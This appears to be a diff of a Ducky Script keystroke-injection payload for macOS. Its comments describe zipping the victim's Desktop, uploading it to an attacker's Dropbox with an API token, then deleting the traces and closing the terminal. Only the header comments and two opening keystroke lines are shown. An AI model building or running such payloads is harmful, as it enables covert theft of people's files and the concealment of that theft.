@@ -1,11 +1,11 @@
 REM This script copies the contents of the Desktop and uploads it to a specific dropbox API
-REM Just replace "<API access token here>" with your actual API access token.
-REM Once the file is uploaded to your dropbox 
-REM the file will be deleted and the terminal will be cleared and closed. 
+REM Just replace "<API access token here>" with your actual API access token. line 23
+REM Once the desktop contents .zip is uploaded to your dropbox 
+REM The Backup folder containing the .zip will be deleted and the terminal will be cleared and closed. 
 
 REM Author: Narsty
 REM Title: Desktop Data to Dropbox 
-REM Version 1.0 MacOs
+REM Version 2.0 MacOs
 
 DELAY 500
 GUI SPACE
